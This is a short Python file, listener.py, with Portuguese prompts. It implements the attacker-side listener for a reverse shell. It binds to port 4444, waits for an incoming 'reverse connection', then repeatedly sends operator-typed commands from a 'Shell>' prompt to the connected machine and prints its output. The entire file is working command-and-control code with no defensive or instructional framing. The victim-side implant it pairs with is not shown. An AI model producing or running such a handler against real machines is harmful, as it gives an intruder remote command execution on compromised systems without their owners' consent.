# arquivo: listener.py
import socket

def main():
    ip = '0.0.0.0'
    porta = 4444

    s = socket.socket()
    s.bind((ip, porta))
    s.listen(1)

    print(f"[+] Aguardando conexão reversa na porta {porta}...")
    conn, addr = s.accept()
    print(f"[+] Conexão recebida de {addr[0]}:{addr[1]}")

    while True:
        comando = input("Shell> ")
        if comando.strip().lower() == 'exit':
            conn.send(b'exit')
            break

        if comando.strip() == '':
            continue

        conn.send(comando.encode())
        resposta = conn.recv(4096).decode()
        print(resposta)

    conn.close()
    s.close()

if __name__ == "__main__":
    main()